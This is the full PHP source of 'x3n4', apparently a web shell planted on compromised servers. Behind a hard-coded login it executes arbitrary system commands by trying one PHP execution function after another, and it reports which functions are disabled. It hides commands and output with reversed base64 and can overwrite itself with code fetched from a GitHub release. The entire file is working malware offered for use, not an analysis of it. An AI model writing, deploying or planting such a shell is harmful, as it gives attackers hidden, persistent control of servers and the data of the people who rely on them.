<?php

define('X3N4_VERSION', 'v0.1.7-alpha');
define('X3N4_ENCRYPTION_ALGORITHM', 'rb64');

$user = 'x3n4';
$password = 'P455W0rd';

/**
 * Functions
 */
function get_shell_prefix()
{
    return get_user() . '@' . php_uname('n') . ':' . getcwd() . ' $';
}
function get_shell_command()
{
    static $shell_command;

    if ($shell_command === null) {
        if (is_function_available('system')) {
            $shell_command = 'system';
        } elseif (is_function_available('shell_exec')) {
            $shell_command = 'shell_exec';
        } elseif (is_function_available('exec')) {
            $shell_command = 'exec';
        } elseif (is_function_available('passthru')) {
            $shell_command = 'passthru';
        } elseif (is_function_available('proc_open')) {
            $shell_command = 'proc_open';
        } elseif (is_function_available('popen')) {
            $shell_command = 'popen';
        }
    }

    return $shell_command;
}
function execute_command($command)
{
    $command .= ' 2>&1';
    switch (get_shell_command()) {
        case 'system':
            ob_start();
            @system($command);
            $output = ob_get_contents();
            ob_end_clean();
            return $output;

        case 'shell_exec':
            return @shell_exec($command);

        case 'exec':
            @exec($command, $outputArr, $code);
            return implode(PHP_EOL, $outputArr);

        case 'passthru':
            ob_start();
            @passthru($command, $code);
            $output = ob_get_contents();
            ob_end_clean();
            return $output;

        case 'proc_open':
            $descriptors = array(
                0 => array('pipe', 'r'),
                1 => array('pipe', 'w'),
                2 => array('pipe', 'w')
            );

            $process = proc_open($command, $descriptors, $pipes, getcwd());

            fclose($pipes[0]);
            $output = stream_get_contents($pipes[1]);
            fclose($pipes[1]);
            $error = stream_get_contents($pipes[2]);
            fclose($pipes[2]);
            $code = proc_close($process);

            return $output;

        case 'popen':
            $process = popen($command, 'r');
            $output = fread($process, 4096);
            pclose($process);
            return $output;

        default:
            return 'None available function to run your command, sorry. :(';
    }
}
function disabled_functions()
{
    static $disabled_fn;

    if ($disabled_fn === null) {
        $df = ini_get('disable_functions');
        $shfb = ini_get('suhosin.executor.func.blacklist');
        $fn_list = array_map('trim', explode(',', "$df,$shfb"));
        $disabled_fn = array_filter($fn_list, create_function('$value', 'return $value !== "";'));
    }

    return $disabled_fn;
}
function is_function_available($function)
{
    return is_callable($function) && !in_array($function, disabled_functions());
}
function output_json($output = '')
{
    $output_data = array(
        'pwd' => empty($_SESSION['pwd']) ? getcwd() : $_SESSION['pwd'],
        'banner' => get_shell_prefix(),
        'stdout' => $output
    );
    if (is_callable('json_encode')) {
        header('Content-Type: text/plain;');
        echo encrypt(json_encode($output_data));
    } else {
        echo encrypt($output_data['banner'] . ' ' . $_REQUEST['cmd'] . PHP_EOL . $output);
    }
    session_write_close();
    exit(0);
}
function require_auth($user, $password)
{
    $AUTH_USER = $user;
    $AUTH_PASS = $password;
    header('Cache-Control: no-cache, must-revalidate, max-age=0');
    $has_supplied_credentials = !(empty($_SERVER['PHP_AUTH_USER']) && empty($_SERVER['PHP_AUTH_PW']));
    $is_not_authenticated = (
        !$has_supplied_credentials ||
        $_SERVER['PHP_AUTH_USER'] != $AUTH_USER ||
        $_SERVER['PHP_AUTH_PW']   != $AUTH_PASS
    );
    if ($is_not_authenticated) {
        header('HTTP/1.1 401 Authorization Required');
        header('WWW-Authenticate: Basic realm="Access denied"');
        exit;
    }
}
function get_motd()
{
    $command = null;

    switch (true) {
        case stristr(PHP_OS, 'DAR'): $command = 'sw_vers'; break;
        case stristr(PHP_OS, 'WIN'): $command = 'ver'; break;
        case stristr(PHP_OS, 'LINUX'): $command = 'cat /etc/motd'; break;
        default : $command = '';
    }
    if (!empty($command)) {
        return execute_command($command);
    }

    return 'Welcome to x3n4 '.X3N4_VERSION;
}
function encrypt($input) {
    switch (X3N4_ENCRYPTION_ALGORITHM) {
        case 'b64':
            return base64_encode($input);

        case 'rb64':
            return strrev(base64_encode($input));
    }
    return $input;
}
function decrypt($input) {
    switch (X3N4_ENCRYPTION_ALGORITHM) {
        case 'b64':
            return base64_decode($input);

        case 'rb64':
            return base64_decode(strrev($input));
    }
    return $input;
}
function get_user()
{
    if (
        is_function_available('posix_getpwuid') &&
        is_function_available('posix_getpid')
    ) {
        $info = posix_getpwuid(posix_getuid());
        return $info['name'];
    }
    return getenv('USERNAME') ? getenv('USERNAME') : getenv('USER');
}

/**
 * CORE
 */
require_auth($user, $password);
session_start();

if (!empty($_SESSION['pwd'])) {
    chdir($_SESSION['pwd']);
}

if (isset($_REQUEST['cmd'])) {
    $REQUESTED_CMD = trim(decrypt($_REQUEST['cmd']));
    if (empty($REQUESTED_CMD)) {
        exit(0);
    }
    if ($REQUESTED_CMD == 'upgrade') {
        $options  = array('http' => array('user_agent' => 'custom user agent string'));
        $context  = stream_context_create($options);
        $releases = @json_decode(@file_get_contents('https://api.github.com/repos/jorge-matricali/x3n4/releases', false, $context));
        if ($releases) {
            $asset = $releases[0]->assets[0]->browser_download_url;
            if ($asset) {
                file_put_contents(__FILE__.'.backup.php', file_get_contents(__FILE__));
                file_put_contents(__FILE__, file_get_contents($asset, false, $context));
            }
        }
        output_json('--- PLEASE REFRESH YOUR BROWSER :D ---');
        exit(0);
    }
    if ($REQUESTED_CMD == 'exit') {
        session_destroy();
        exit(0);
    }
    if (substr($REQUESTED_CMD, 0, 3) === 'cd ') {
        $dir = substr($REQUESTED_CMD, 3);
        $dir = realpath($dir);
        if (chdir($dir)) {
            $_SESSION['pwd'] = $dir;
            output_json();
        }
    }

    $output = execute_command($REQUESTED_CMD);
    output_json($output);
}

/**
 * HTML
 */
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <!-- The above 3 meta tags *must* come first in the head; any other head content must come *after* these tags -->
    <title>x3n4 <?php echo X3N4_VERSION; ?></title>

    <!-- Bootstrap -->
    <link href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap-theme.min.css" rel="stylesheet">
    <link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">

    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
    <!--[if lt IE 9]>
    <script src="https://oss.maxcdn.com/html5shiv/3.7.3/html5shiv.min.js"></script>
    <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
    <![endif]-->
    <style>
    #stdout {
        max-height: 650px;
        background: #2F3129;
        color: #8F908A;
    }
    </style>
</head>
<body>
    <div class="container">
        <h1 class="page-header">
            <span class="pull-right label label-<?php echo ini_get('safe_mode') ? 'success' : 'danger'; ?>">safe_mode <?php echo ini_get('safe_mode') ? 'ON' : 'OFF'; ?></span>
            x3n4 <?php echo X3N4_VERSION; ?>
        </h1>

        <ul class="nav nav-tabs" role="tablist">
            <li role="presentation"><a href="#information" aria-controls="information" role="tab" data-toggle="tab"><i class="fa fa-info-circle"></i> System information</a></li>
            <li role="presentation" class="active"><a href="#console" aria-controls="console" role="tab" data-toggle="tab"><i class="fa fa-terminal"></i> Console</a></li>
        </ul>
        <p></p>
        <div class="tab-content">
            <div id="information" role="tabpanel" class="tab-pane table-responsive">
                <table class="table">
                    <tr>
                        <td>System:</td>
                        <td>
                            <?php
                            switch (PHP_OS) {
                                case 'Linux':
                                    $platform_icon = 'fa-linux';
                                    break;
                                case 'WINNT':
                                    $platform_icon = 'fa-windows';
                                    break;
                                case 'Darwin':
                                    $platform_icon = 'fa-osx';
                                    break;
                                default:
                                    $platform_icon = 'fa-unknown';
                            }
                            ?>
                            <i class="fa <?php echo $platform_icon; ?>"></i> <?php echo php_uname(); ?>
                        </td>
                    </tr>
                    <tr>
                        <td>Current user:</td>
                        <td><?php echo get_user(); ?></td>
                    </tr>
                    <tr>
                        <td>Server IP:</td>
                        <td><?php echo $_SERVER['SERVER_ADDR']; ?></td>
                    </tr>
                    <tr>
                        <td>Server Name:</td>
                        <td><?php echo $_SERVER['SERVER_NAME']; ?></td>
                    </tr>
                    <tr>
                        <td>Server Sofware:</td>
                        <td><?php echo $_SERVER['SERVER_SOFTWARE']; ?></td>
                    </tr>
                    <tr>
                        <td>PHP Version:</td>
                        <td><?php echo phpversion(); ?></td>
                    </tr>
                    <tr>
                        <td>Client IP:</td>
                        <td><?php echo $_SERVER['REMOTE_ADDR']; ?></td>
                    </tr>
                    <tr>
                        <td>Installed modules:</td>
                        <td><?php echo implode(', ', get_loaded_extensions()); ?></td>
                    </tr>
                    <tr>
                        <td>Disabled functions:</td>
                        <td><?php echo implode(', ', disabled_functions()); ?></td>
                    </tr>
                    <tr>
                        <td>Shell function:</td>
                        <td><?php echo get_shell_command(); ?></td>
                    </tr>
                </table>
            </div>

            <div id="console" role="tabpanel" class="tab-pane active">
                <pre id="stdout"><?php echo get_motd() . PHP_EOL; ?></pre>
                <div class="form-group">
                    <div class="input-group">
                        <span class="input-group-addon hidden-xs" id="pwd"><?php echo get_shell_prefix(); ?></span>
                        <input type="text" id="stdin" class="form-control" />
                        <span class="input-group-btn">
                            <button type="button" class="btn btn-default" id="btnExecCommand">Send</button>
                        </span>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <!-- jQuery (necessary for Bootstrap's JavaScript plugins) -->
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>
    <!-- Include all compiled plugins (below), or include individual files as needed -->
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
    <script>
        function x3n4 () {
            this.version = '<?php echo X3N4_VERSION; ?>';
            this.script_path = '<?php echo $_SERVER['REQUEST_URI']; ?>';
            this.algo = '<?php echo X3N4_ENCRYPTION_ALGORITHM; ?>';
            this.history = {
                list: JSON.parse(window.localStorage.getItem('history') || '[]'),
                position: -1,
                up: function() {
                    if (this.list.length === 0) return;
                    if (this.position < (this.list.length - 1)) {
                        this.position++;
                    }
                    this.render();
                },
                down: function () {
                    if (this.list.length === 0) return;
                    if (this.position >= 0) {
                        this.position--;
                    }
                    this.render();
                },
                render: function () {
                    $('#stdin').val(this.list[(this.list.length - 1) - this.position]);
                },
                add: function (value) {
                    this.list.push(value);
                    this.position = -1;
                    this.save();
                },
                clean: function () {
                    this.list = [];
                    window.localStorage.removeItem('history');
                },
                save: function () {
                    window.localStorage.setItem('history', JSON.stringify(this.list));
                }
            }
            this.encrypt = function(input) {
                switch (this.algo) {
                    case 'b64':
                        return window.btoa(input);
                    case 'rb64':
                        return window.btoa(input).split('').reverse().join('');
                }
                return input;
            }
            this.decrypt = function(input) {
                switch (this.algo) {
                    case 'b64':
                        return window.atob(input);
                    case 'rb64':
                        return window.atob(input.split('').reverse().join(''));
                }
                return input;
            }
            this.execCommand = function(command) {
                this.history.add(command);
                /* Internal command handler */
                switch (command.trim()) {
                    case 'clear':
                        $('#stdout').html('');
                        return;
                    case 'exit':
                        this.history.clean();
                        break;
                }
                $('#stdout').append($('#pwd').html() + " " + command + "\n");
                var that = this;
                /* Server-side command handler */
                $.post(this.script_path, {cmd: this.encrypt(command)}, function(data) {
                    data = JSON.parse(that.decrypt(data));
                    $('#stdout').append(data.stdout);
                    $('#pwd').html(data.banner);
                    $('#stdout').scrollTop($('#stdout')[0].scrollHeight);
                });
            }
            this.clickExecCommand = function() {
                window.x3n4.execCommand($('#stdin').val());
                $('#stdin').val('');
            }
            this.checkUpdate = function() {
                $.get('https://api.github.com/repos/jorge-matricali/x3n4/releases', function(data) {
                    if (window.x3n4.version !== data[0].tag_name) {
                        $('#stdout').append('/!\\ x3n4 ' + data[0].tag_name + " available. Type 'upgrade' to download the latest version automatically.\n");
                        $('#stdout').scrollTop($('#stdout')[0].scrollHeight);
                    }
                });
            }
            this.declareCallbacks = function() {
                $('#btnExecCommand').on('click', this.clickExecCommand);
                $('#stdin').on('keypress', function(ev) {
                    if ((ev.keyCode ? ev.keyCode : ev.which) == '13') {
                        $('#btnExecCommand').click()
                    }
                });
                $('#stdin').on('keydown', { history : this.history }, function (ev) {
                    var code = ev.keyCode ? ev.keyCode : ev.which;
                    switch (code) {
                        case 38:
                            ev.data.history.up();
                            break;
                        case 40:
                            ev.data.history.down();
                            break;
                    }
                });
            }
        }
        window.x3n4 = new x3n4();
        window.x3n4.declareCallbacks();
        window.x3n4.checkUpdate();
    </script>
</body>
</html>
